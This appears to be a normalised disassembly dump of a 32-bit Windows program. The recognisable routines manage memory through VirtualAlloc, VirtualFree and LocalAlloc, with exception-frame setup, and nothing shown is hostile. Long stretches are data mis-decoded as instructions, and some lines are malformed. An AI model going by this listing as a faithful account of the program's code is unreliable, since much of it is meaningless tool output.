sub_401092
call [ eax + r-xdata ]
or al [ esi ]
push ebx
je r-xdata
arpl [ esp + edi * 8 + 0x10 ] si
imul ebp [ esi + 0x67 ] r-xdata
or al 0x7
push esi
popad
jb r-xdata
add [ eax ] al
je r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
popad
adc [ ecx ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x0
add [ eax ] al
mov al 0x10
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ eax + ebx * 2 ] dh
inc eax
add [ eax + 0x58 ] al
inc eax
add [ ebx + esi + 0x33780040 ] al
inc eax
add [ eax + 0x58 ] dl
inc eax
add ah bl
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ ecx ] dl
push esp
dec ecx
outsb
je r-xdata
inc eax
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x11f00040 ] cl
inc eax
add [ ecx + 0x4011 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
adc [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
insd
add [ eax ] al
sub [ ecx ] dl
inc eax
add [ edi ] cl
or cl [ ecx + 0x49 ]
outsb
je r-xdata
nop
inc eax
adc [ eax ] al
add [ edi ] eax
dec ecx
outsb
je r-xdata
inc eax
add ah bh
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
sar bh 0x25
jb r-xdata
inc esi
jne r-xdata
jb r-xdata
outsb
je r-xdata
jb r-xdata
push ebx
jns r-xdata
cld
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ ebx - 0x73da0040 ] cl
loope r-xdata
add [ ebx - 0x53da0040 ] cl
loope r-xdata
mov ah 0xe1
dec eax
add [ ebx - 0x4fda0040 ] cl
loope r-xdata
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
popad
arpl [ ebp ] sp
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push es
push ebx
jns r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
mov eax eax
pop eax
adc [ eax ] al
add [ edx + eax * 2 ] eax
jns r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
pop es
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x11 ] si
inc eax
add [ edi ] al
pop es
push esp
dec edi
bound ebp [ edx + 0x65 ]
add [ ebx + 0x7c25ffc0 ] cl
loope r-xdata
add [ ebx - 0x3da0040 ] cl
loope r-xdata
add [ ebx - 0x57da0040 ] cl
loope r-xdata
add [ eax ] al
add [ eax ] al
[ eax ] eax
je r-xdata
adc [ eax ] al
add al 0x0
add [ gs : eax ] eax
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add [ edi + edx * 2 ] eax
outsd
jb r-xdata
and eax __import_lookup_table_0(kernel32:VirtualAlloc)
mov eax eax
add [ ebx + 0x7825ffc0 ] cl
loope r-xdata
add [ ebx - 0x7da0040 ] cl
loope r-xdata
add [ ebx - 0x5bda0040 ] cl
loope r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add eax [ eax ]
add [ eax ] al
add bh bh
inc [ eax ]
add [ eax + r-xdata ] dl
add [ eax ] ecx
inc ebx
popad
jb r-xdata
and eax VirtualFree@IAT
mov eax eax
add [ ebx + 0x7425ffc0 ] cl
loope r-xdata
add [ ebx - 0xbda0040 ] cl
loope r-xdata
add [ ebx - 0x5fda0040 ] cl
loope r-xdata
inc eax
add [ eax + 0x33 ] bh
imul ebp [ esi + 0x61 ] 0x56c
add [ eax ] al
and eax __import_lookup_table_0(kernel32:InitializeCriticalSection)
mov eax eax
add [ ebx - 0x3b7cac40 ] cl
mov esp 0xabb
add [ eax + ebp * 8 + 0x59 ] dl
add [ ebx - 0x77da0040 ] cl
loope r-xdata
add [ ebx - 0x63da0040 ] cl
loope r-xdata
or al [ eax ]
add [ eax ] al
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
add [ ebx - 0x7bda0040 ] cl
loope r-xdata
add [ ebx - 0x67da0040 ] cl
loope r-xdata
mov eax ebx
movzx ebx [ esp + 0x30 ]
add [ ebx + 0xc25ffc0 ] cl
loop r-xdata
add [ ebx - 0x1bda0040 ] cl
loope r-xdata
pop ebx
retn
add eax 0x245cb70f
xor [ ebx + 0x44c483c3 ] cl
add [ ebx + 0x825ffc0 ] cl
loop r-xdata
add [ ebx - 0x6bda0040 ] cl
loope r-xdata
add esp 0x44
add [ ebx + 0x425ffc0 ] cl
loop r-xdata
add [ ebx - 0x6fda0040 ] cl
loope r-xdata
and eax __import_lookup_table_0(kernel32:LocalAlloc)
mov eax eax
add [ ebx - 0x7fda0040 ] cl
loope r-xdata
and eax LocalFree@IAT
mov eax eax
sub_401153
dec esp
add [ esp + 0x4 ] 0xfffffff8
jmp r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4031dc
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_401175
push ebp
adc [ eax ] eax
pop edi
adc [ eax ] eax
imul edx [ ecx ] 0x10040
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
jne r-xdata
adc [ ecx ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
[ eax ] eax
or al 0x0
add [ eax ] al
mov al 0x10
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ eax + ebx * 2 ] dh
inc eax
add [ eax + 0x58 ] al
inc eax
add [ ebx + esi + 0x33780040 ] al
inc eax
add [ eax + 0x58 ] dl
inc eax
add ah bl
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ ecx ] dl
push esp
dec ecx
outsb
je r-xdata
inc eax
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x11f00040 ] cl
inc eax
add [ ecx + 0x4011 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
adc [ eax ] eax
sar bh 0x25
jb r-xdata
add [ ebx - 0x73da0040 ] cl
loope r-xdata
add [ ebx - 0x53da0040 ] cl
loope r-xdata
mov ah 0xe1
dec eax
add [ ebx - 0x4fda0040 ] cl
loope r-xdata
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
add [ ebx + 0x7c25ffc0 ] cl
loope r-xdata
add [ ebx - 0x3da0040 ] cl
loope r-xdata
add [ ebx - 0x57da0040 ] cl
loope r-xdata
and eax __import_lookup_table_0(kernel32:VirtualAlloc)
mov eax eax
add [ ebx + 0x7825ffc0 ] cl
loope r-xdata
add [ ebx - 0x7da0040 ] cl
loope r-xdata
add [ ebx - 0x5bda0040 ] cl
loope r-xdata
and eax VirtualFree@IAT
mov eax eax
add [ ebx + 0x7425ffc0 ] cl
loope r-xdata
add [ ebx - 0xbda0040 ] cl
loope r-xdata
add [ ebx - 0x5fda0040 ] cl
loope r-xdata
and eax __import_lookup_table_0(kernel32:InitializeCriticalSection)
mov eax eax
add [ ebx - 0x3b7cac40 ] cl
mov esp 0xabb
add [ eax + ebp * 8 + 0x59 ] dl
add [ ebx - 0x77da0040 ] cl
loope r-xdata
add [ ebx - 0x63da0040 ] cl
loope r-xdata
or al [ eax ]
add [ eax ] al
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
add [ ebx - 0x7bda0040 ] cl
loope r-xdata
add [ ebx - 0x67da0040 ] cl
loope r-xdata
mov eax ebx
movzx ebx [ esp + 0x30 ]
add [ ebx + 0xc25ffc0 ] cl
loop r-xdata
add [ ebx - 0x1bda0040 ] cl
loope r-xdata
pop ebx
retn
add eax 0x245cb70f
xor [ ebx + 0x44c483c3 ] cl
add [ ebx + 0x825ffc0 ] cl
loop r-xdata
add [ ebx - 0x6bda0040 ] cl
loope r-xdata
add esp 0x44
add [ ebx + 0x425ffc0 ] cl
loop r-xdata
add [ ebx - 0x6fda0040 ] cl
loope r-xdata
and eax __import_lookup_table_0(kernel32:LocalAlloc)
mov eax eax
add [ ebx - 0x7fda0040 ] cl
loope r-xdata
and eax LocalFree@IAT
mov eax eax
sub_401380
push ebx
push esi
mov esi rw-data
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x644
push 0x0
call sub_401340
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov [ rw-data ] ecx
xor edx edx
xor eax eax
pop esi
pop ebx
retn
mov eax edx
add eax eax
lea eax [ ecx + eax * 8 + 0x4 ]
mov ebx [ esi ]
mov [ eax ] ebx
mov [ esi ] eax
inc edx
cmp edx 0x64
jne r-xdata
sub_4013d8
push ebx
push esi
mov esi edx
mov ebx eax
call sub_401380
test eax eax
jne r-xdata
mov edx [ esi ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebx ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ edx + 0x4 ] eax
mov [ ebx ] eax
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_401420
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov [ esp ] edx
mov ebp eax
mov ebx [ ebp ]
mov eax [ esp ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
add eax [ esi + 0x4 ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax ebx
call sub_401408
mov eax [ ebx + 0x8 ]
mov [ esi ] eax
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov ebx edi
cmp ebp ebx
jne r-xdata
mov eax ebx
call sub_401408
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
mov edi [ ebx ]
mov eax [ esi ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jne r-xdata
mov edx esi
mov eax ebp
call sub_4013d8
test al al
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esi ] eax
sub_401490
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov edi ebx
mov ebx [ ebx ]
cmp edi ebx
jne r-xdata
mov ecx esi
add ecx [ edx + 0x4 ]
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
ja r-xdata
mov esi [ edx ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jb r-xdata
xor eax eax
cmp esi eax
jne r-xdata
mov ecx esi
mov edi [ edx + 0x4 ]
add ecx edi
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
jne r-xdata
mov eax [ edx + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ edx + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx [ edx + 0x4 ]
mov [ esp ] ecx
mov edi [ ebx + 0x8 ]
add edi [ ebx + 0xc ]
sub edi ecx
mov [ esp + 0x4 ] edi
sub esi eax
mov [ ebx + 0xc ] esi
mov edx esp
mov eax ebx
call sub_4013d8
test al al
jne r-xdata
sub [ ebx + 0xc ] edi
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
call sub_401408
jmp r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_401524
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp esi 0x100000
jge r-xdata
add esi 0xffff
and esi 0xffff0000
mov esi 0x100000
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013d8
test al al
jne r-xdata
mov [ ebx + 0x4 ] esi
push 0x1
push 0x2000
push esi
push 0x0
call sub_401350
mov edi eax
mov [ ebx ] edi
test edi edi
je r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_401588
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
mov [ ebx + 0x4 ] 0x100000
push 0x4
push 0x2000
push 0x100000
push ebp
call sub_401350
mov edi eax
mov [ ebx ] edi
test edi edi
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
add esi 0xffff
and esi 0xffff0000
mov [ ebx + 0x4 ] esi
push 0x4
push 0x2000
push esi
push ebp
call sub_401350
mov [ ebx ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013d8
test al al
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_401600
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov [ esp + 0xc ] edx
mov ebp eax
mov eax [ esp ]
add eax ebp
mov [ esp + 0x10 ] eax
mov ebx [ rw-data ]
jmp r-xdata
cmp ebx rw-data
jne r-xdata
mov edi [ ebx ]
mov esi [ ebx + 0x8 ]
cmp ebp esi
ja r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ebx edi
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0x10 ]
ja r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
cmp esi [ esp + 0x8 ]
jae r-xdata
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x8 ] esi
push 0x8000
push 0x0
push esi
call VirtualFree
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov eax ebx
call sub_401408
mov [ rw-data ] 0x1
sub_4016b8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx eax
mov ebp edx
and ebp 0xfffff000
add edx [ esp ]
add edx 0xfff
and edx 0xfffff000
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov [ eax ] ebp
mov eax [ esp + 0x8 ]
sub eax ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebp ebx
jbe r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esp + 0x8 ]
jbe r-xdata
mov ebx ebp
cmp edi ebx
jbe r-xdata
mov edi [ esp + 0x8 ]
mov esi [ esi ]
push 0x4
push 0x1000
sub edi ebx
push edi
push ebx
call sub_401350
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
sub_40174c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov esi ebx
add esi 0xfff
and esi 0xfffff000
mov [ esp ] esi
mov ebp ebx
add ebp edx
and ebp 0xfffff000
mov eax [ esp ]
mov [ ecx ] eax
mov eax ebp
sub eax [ esp ]
mov [ ecx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebx [ esp ]
jae r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp edi
jae r-xdata
mov ebx [ esp ]
cmp edi ebx
jbe r-xdata
mov edi ebp
mov esi [ esi ]
push 0x4000
sub edi ebx
push edi
push ebx
call VirtualFree
test eax eax
jne r-xdata
mov [ rw-data ] 0x2
sub_4017cc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
jne r-xdata
cmp edi [ ebx + 0xc ]
jg r-xdata
mov edx esi
mov eax edi
call sub_401524
cmp [ esi ] 0x0
je r-xdata
mov ebx [ ebx ]
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_4016b8
cmp [ esi ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebp
call sub_401420
cmp [ esp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esi + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebp ]
jmp r-xdata
mov ecx esp
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_401600
xor eax eax
mov [ esi ] eax
mov eax ebx
call sub_401408
jmp r-xdata
sub_40185c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
je r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_401588
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edi [ ebx + 0xc ]
jle r-xdata
mov ebx [ ebx ]
mov ebp [ ebx + 0x8 ]
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401420
cmp [ esp + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
sub edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
add eax [ ebx + 0xc ]
call sub_401588
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
cmp edi [ ebx + 0xc ]
jg r-xdata
mov ebx [ ebp ]
jmp r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401600
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401420
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx edi
mov eax ebp
call sub_4016b8
mov eax [ esp ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401600
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esp ]
mov eax [ eax + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_401408
jmp r-xdata
sub_401980
push ebx
push esi
push edi
add esp 0xffffffec
mov edi ecx
mov [ esp ] edx
lea ebx [ eax + 0x3fff ]
and ebx 0xffffc000
mov esi [ esp ]
add esi eax
and esi 0xffffc000
cmp ebx esi
jae r-xdata
xor eax eax
mov [ edi ] eax
mov ecx edi
mov edx esi
sub edx ebx
mov eax ebx
call sub_40174c
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax rw-data
call sub_401420
mov ebx [ esp + 0x4 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_401600
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax rw-data
call sub_401490
jmp r-xdata
sub_401a0c
push ebp
mov ebp esp
xor edx edx
push ebp
push sub_401ac2
push [ fs : edx ]
mov [ fs : edx ] esp
push rw-data
call sub_401360
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_4013d0
mov eax rw-data
call sub_4013d0
mov eax rw-data
call sub_4013d0
push 0xff8
push 0x0
call sub_401340
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_401368
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_401ac9
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x3
retn
push rw-data
call sub_401370
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + eax * 4 - 0xc ] ecx
inc eax
cmp eax 0x401
jne r-xdata
mov eax rw-data
mov [ eax + 0x4 ] eax
mov [ eax ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_401ad0
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ebp
retn
xor edx edx
push ebp
push sub_401ba6
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push eax
call LocalFree
xor eax eax
mov [ rw-data ] eax
mov ebx [ rw-data ]
jmp r-xdata
push rw-data
call sub_401368
cmp ebx rw-data
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call VirtualFree
mov ebx [ ebx ]
mov eax rw-data
call sub_4013d0
mov eax rw-data
call sub_4013d0
mov eax rw-data
call sub_4013d0
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
push eax
call LocalFree
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call sub_401378
retn
push rw-data
call sub_401370
sub_401bb0
push ebx
cmp eax [ rw-data ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0x1000
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
cmp eax edx
jne r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
sar ecx 0x2
mov ebx [ rw-data ]
mov [ ebx + ecx * 4 - 0xc ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
pop ebx
retn
add ecx 0x3
sar ecx 0x2
mov eax [ rw-data ]
xor edx edx
mov [ eax + ecx * 4 - 0xc ] edx
jmp r-xdata
add ecx 0x3
pop ebx
retn
sub_401c14
mov edx [ rw-data ]
jmp r-xdata
cmp edx rw-data
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jb r-xdata
mov [ rw-data ] 0x3
xor edx edx
mov edx [ edx ]
add ecx [ edx + 0xc ]
cmp eax ecx
jb r-xdata
mov eax edx
retn
sub_401c44
push ebx
mov ecx edx
sub ecx 0x4
lea ebx [ ecx + eax ]
cmp edx 0x10
jl r-xdata
cmp edx 0x4
jl r-xdata
mov [ ebx ] 0x80000007
mov edx ecx
call sub_401e18
pop ebx
retn
pop ebx
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
mov [ ebx ] ecx
sub_401c98
cmp edx 0xc
jl r-xdata
cmp edx 0x4
jl r-xdata
or edx 0x2
mov [ eax ] edx
add eax 0x4
call sub_401c74
retn
add eax edx
and [ eax ] 0xfffffffe
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
sub_401cc0
push ebx
push esi
mov edx eax
sub edx 0x4
mov edx [ edx ]
mov ecx edx
and ecx 0x80000002
cmp ecx 0x80000002
je r-xdata
mov ebx edx
and ebx 0x7ffffffc
sub eax ebx
mov ecx eax
xor edx [ ecx ]
test edx 0xfffffffe
je r-xdata
mov [ rw-data ] 0x4
test [ ecx ] 0x1
je r-xdata
mov [ rw-data ] 0x5
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
sub edx 0xc
mov esi [ edx + 0x8 ]
sub eax esi
cmp esi [ eax + 0x8 ]
je r-xdata
call sub_401bb0
add ebx esi
mov [ rw-data ] 0x6
sub_401d30
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
test al 0x2
jne r-xdata
and eax 0x7ffffffc
add edi eax
add ebx eax
mov eax [ ebx ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
call sub_401bb0
mov eax [ esi + 0x8 ]
add edi eax
add ebx eax
and [ ebx ] 0xfffffffe
sub_401d68
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
mov [ esp ] 0x0
mov eax esi
call sub_401c14
mov ebx eax
test ebx ebx
je r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ ebx + 0x8 ]
mov eax ebp
add eax [ ebx + 0xc ]
mov edx eax
lea ecx [ edi + esi ]
sub edx ecx
cmp edx 0xc
jg r-xdata
mov eax esi
sub eax ebp
cmp eax 0xc
jge r-xdata
mov edi eax
sub edi esi
lea ecx [ esp + 0x1 ]
mov edx edi
sub edx 0x4
lea eax [ esi + 0x4 ]
call sub_401980
lea ecx [ esp + 0x1 ]
mov edx esi
sub edx [ ebx + 0x8 ]
add edx edi
mov eax ebp
call sub_401980
jmp r-xdata
mov edx ebp
sub edx esi
mov eax esi
call sub_401c44
mov eax ebp
add eax [ esp + 0x5 ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jae r-xdata
mov ebp [ esp + 0x1 ]
test ebp ebp
je r-xdata
lea edx [ esp + 0x1 ]
mov eax ebx
call sub_401490
mov [ esp ] 0x1
lea edx [ edi + esi ]
sub edx eax
call sub_401c98
sub_401e18
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx edi
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
sub eax 0xc
mov [ eax + 0x8 ] esi
cmp esi 0x1000
jg r-xdata
cmp esi 0x3c00
jl r-xdata
mov edx esi
test edx edx
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
mov edx esi
mov eax edi
call sub_401d68
test al al
jne r-xdata
sar edx 0x2
mov eax [ rw-data ]
mov eax [ eax + edx * 4 - 0xc ]
test eax eax
jne r-xdata
add edx 0x3
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov [ eax + edx * 4 - 0xc ] ebx
mov [ ebx + 0x4 ] ebx
mov [ ebx ] ebx
jmp r-xdata
sub_401ea0
cmp [ rw-data ] 0x0
jle r-xdata
retn
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ rw-data ]
or eax 0x2
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
add eax 0x4
call sub_401c74
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
jmp r-xdata
sub_401eec
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi esp
call sub_401ea0
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax rw-data
call sub_401420
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ edi ]
cmp ebx eax
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
add eax [ edi + 0x4 ]
mov esi ebx
add esi [ esp + 0xc ]
cmp eax esi
jae r-xdata
call sub_401cc0
sub [ edi ] eax
